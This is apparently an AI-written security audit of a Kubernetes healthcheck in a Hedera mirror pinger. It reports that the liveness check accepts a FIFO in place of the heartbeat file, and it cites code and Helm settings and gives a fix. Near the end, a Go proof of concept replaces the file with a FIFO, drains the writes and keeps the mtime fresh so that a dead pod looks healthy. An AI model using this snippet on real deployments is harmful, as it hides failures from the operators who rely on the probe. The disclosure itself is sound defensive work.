All referenced code, configuration, and deployment files have been verified against the actual repository. Here is the assessment:

---

Audit Report

## Title
FIFO Substitution Defeats Liveness Probe via Unvalidated `os.Stat` on `/tmp/alive`

## Summary
`pinger/cmd/healthcheck/main.go` uses `os.Stat("/tmp/alive")` to validate the heartbeat file but never checks that the path refers to a regular file. An attacker with write access to `/tmp` inside the container can substitute a named pipe (FIFO) for the regular file, allowing them to control both the existence and `mtime` of the path independently of the pinger process — permanently suppressing Kubernetes liveness-triggered restarts.

## Finding Description

**Verified code path** — `pinger/cmd/healthcheck/main.go`, `main()`, `case "live":`:

```go
fi, err := os.Stat("/tmp/alive")   // succeeds on any inode type, including FIFO
if err != nil {
    fmt.Fprintln(os.Stderr, err)
    os.Exit(1)
}
age := time.Since(fi.ModTime())    // mtime is attacker-controllable on a FIFO
if age > 2*time.Minute {
    fmt.Fprintln(os.Stderr, "heartbeat stale")
    os.Exit(1)
}
os.Exit(0)
``` [1](#0-0) 

**Root cause:** `os.Stat` returns successfully for any filesystem object — regular file, FIFO, socket, device node. The code never calls `fi.Mode().IsRegular()` or checks `fi.Mode()&os.ModeNamedPipe`. The only validation is existence and `ModTime()`, both trivially satisfied by a FIFO.

**Heartbeat writer** — `pinger/main.go` line 36:

```go
_ = os.WriteFile("/tmp/alive", []byte(time.Now().Format(time.RFC3339Nano)), 0644)
``` [2](#0-1) 

`os.WriteFile` opens with `O_WRONLY|O_CREATE|O_TRUNC`. On a FIFO, this blocks until a reader is present. If the attacker holds the read end open, writes succeed and the FIFO's `mtime` is updated on every 15-second tick — indistinguishable from a normal heartbeat.

**Why existing hardening does not prevent this:**

- `readOnlyRootFilesystem: true` does not protect `/tmp`; it is a separate writable `emptyDir: {}` tmpfs mount. [3](#0-2) 
- `capabilities: drop: [ALL]` and `runAsNonRoot: true` do not prevent `mknod(S_IFIFO)` (creating a FIFO requires no capability) or `utimensat` (permitted for the file owner without any capability). [4](#0-3) 
- `seccompProfile: type: RuntimeDefault` does not block either syscall. [5](#0-4) 

## Impact Explanation
The liveness probe (`exec: ["/healthcheck", "live"]`, `periodSeconds: 10`, `failureThreshold: 5`) is the sole Kubernetes mechanism for detecting and restarting a stuck or dead pinger pod. [6](#0-5) 

By defeating it, an attacker can prevent automatic recovery: a pinger that has stopped submitting Hedera transactions will appear permanently healthy. The monitoring and self-healing function of the pinger is silently eliminated. Classified as a griefing/availability impact — no direct economic damage to network users, but operational visibility and pod self-healing are lost indefinitely.

## Likelihood Explanation
**Precondition:** arbitrary code execution inside the container with write access to `/tmp`. The container is `FROM scratch` with only two binaries (`/pinger`, `/healthcheck`) and no shell. [7](#0-6) 

The deployment template mounts the `tmp` emptyDir to a single container with no sidecars sharing the volume, ruling out the sidecar-compromise path. [3](#0-2) 

The realistic entry point is a supply-chain compromise of the pinger binary. This is a non-trivial barrier. However, once the precondition is met, the exploit is fully deterministic, requires no privileges, and survives pod restarts (the attacker re-creates the FIFO after each restart). The attack also requires the attacker to maintain a persistent reader process to keep the FIFO unblocked and periodically call `utimensat` — meaning it requires sustained presence, not just a one-shot write.

## Recommendation
In `pinger/cmd/healthcheck/main.go`, after the `os.Stat` call, add a regular-file type check before trusting `ModTime()`:

```go
fi, err := os.Stat("/tmp/alive")
if err != nil {
    fmt.Fprintln(os.Stderr, err)
    os.Exit(1)
}
if !fi.Mode().IsRegular() {
    fmt.Fprintln(os.Stderr, "heartbeat file is not a regular file")
    os.Exit(1)
}
age := time.Since(fi.ModTime())
if age > 2*time.Minute {
    fmt.Fprintln(os.Stderr, "heartbeat stale")
    os.Exit(1)
}
os.Exit(0)
``` [8](#0-7) 

Apply the same check to the `"ready"` case for `/tmp/ready` for consistency. [9](#0-8) 

## Proof of Concept

```go
// Attacker code running inside the container (e.g., injected via supply-chain)
package main

import (
    "os"
    "syscall"
    "time"
)

func main() {
    // 1. Remove the existing regular file
    os.Remove("/tmp/alive")

    // 2. Create a FIFO at the same path (no privilege required)
    syscall.Mknod("/tmp/alive", syscall.S_IFIFO|0644, 0)

    // 3. Open the read end to unblock the pinger's os.WriteFile (O_WRONLY blocks without a reader)
    r, _ := os.OpenFile("/tmp/alive", os.O_RDONLY, 0)
    defer r.Close()

    // 4. Drain writes from the pinger to prevent blocking (pinger writes every 15s)
    go func() {
        buf := make([]byte, 256)
        for { r.Read(buf) }
    }()

    // 5. When ready to suppress restart: kill the pinger, then keep mtime fresh via utimensat
    // syscall.Kill(pingerPID, syscall.SIGKILL)
    for {
        // utimensat with current time — no privilege required for file owner
        now := syscall.NsecToTimespec(time.Now().UnixNano())
        syscall.UtimesNano("/tmp/alive", []syscall.Timespec{now, now})
        time.Sleep(30 * time.Second)
    }
    // healthcheck live: os.Stat succeeds, ModTime() is always < 2 minutes old → os.Exit(0)
}
```

### Citations

**File:** pinger/cmd/healthcheck/main.go (L18-24)
```go
	case "ready":
		// Ready if init marker exists
		if _, err := os.Stat("/tmp/ready"); err != nil {
			fmt.Fprintln(os.Stderr, "not ready")
			os.Exit(1)
		}
		os.Exit(0)
```

**File:** pinger/cmd/healthcheck/main.go (L26-39)
```go
	case "live":
		fi, err := os.Stat("/tmp/alive")
		if err != nil {
			// Missing/invalid heartbeat file => not alive
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}

		age := time.Since(fi.ModTime())
		if age > 2*time.Minute {
			fmt.Fprintln(os.Stderr, "heartbeat stale")
			os.Exit(1)
		}
		os.Exit(0)
```

**File:** pinger/main.go (L35-37)
```go
			case <-t.C:
				_ = os.WriteFile("/tmp/alive", []byte(time.Now().Format(time.RFC3339Nano)), 0644)
			}
```

**File:** charts/hedera-mirror-pinger/templates/deployment.yaml (L42-53)
```yaml
          volumeMounts:
            - name: tmp
              mountPath: /tmp
      imagePullSecrets: {{ toYaml .Values.image.pullSecrets | nindent 8 }}
      nodeSelector: {{ toYaml .Values.nodeSelector | nindent 8 }}
      priorityClassName: {{ .Values.priorityClassName }}
      securityContext: {{ toYaml .Values.podSecurityContext | nindent 8 }}
      terminationGracePeriodSeconds: {{ .Values.terminationGracePeriodSeconds }}
      tolerations: {{ toYaml .Values.tolerations | nindent 8 }}
      volumes:
        - name: tmp
          emptyDir: {}
```

**File:** charts/hedera-mirror-pinger/values.yaml (L38-44)
```yaml
livenessProbe:
  exec:
    command: ["/healthcheck", "live"]
  initialDelaySeconds: 0
  periodSeconds: 10
  timeoutSeconds: 2
  failureThreshold: 5
```

**File:** charts/hedera-mirror-pinger/values.yaml (L55-57)
```yaml
  seccompProfile:
    type: RuntimeDefault

```

**File:** charts/hedera-mirror-pinger/values.yaml (L80-84)
```yaml
securityContext:
  allowPrivilegeEscalation: false
  capabilities:
    drop: [ALL]
  readOnlyRootFilesystem: true
```

**File:** pinger/Dockerfile (L36-43)
```text
FROM scratch

COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/
COPY --from=builder /out/pinger /pinger
COPY --from=builder /out/healthcheck /healthcheck

USER 1000:1000
ENTRYPOINT ["/pinger"]
```
